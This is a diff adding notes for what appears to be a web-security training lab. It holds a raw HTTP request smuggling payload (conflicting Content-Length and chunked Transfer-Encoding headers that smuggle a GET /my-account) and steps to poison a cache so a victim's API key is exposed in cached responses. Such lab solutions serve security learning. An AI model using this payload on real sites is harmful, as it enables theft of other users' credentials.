@@ -1,0 +1,24 @@
+// Discovered /my-account URL will reveal user's API key
+// /my-account also does not have anti-caching headers
+// When victim visit this page, will be cached
+POST / HTTP/1.1
+Host: acf01f2b1ff92288813bb38200ac005d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acf01f2b1ff92288813bb38200ac005d.web-security-academy.net/login
+Connection: keep-alive
+Cookie: session=RRHhXBKarKN3nX8nJBwQk2BmNJ4c40QD
+Upgrade-Insecure-Requests: 1
+Content-Length: 42
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+X-Ignore: X
+
+// Repeat this request a few times, then load the home page in an incognito browser window
+// Proxy -> HTTP history -> Response -> Search for "Your API Key"
+// User's API key might be cached in any of request for the static resources such as request for javascript
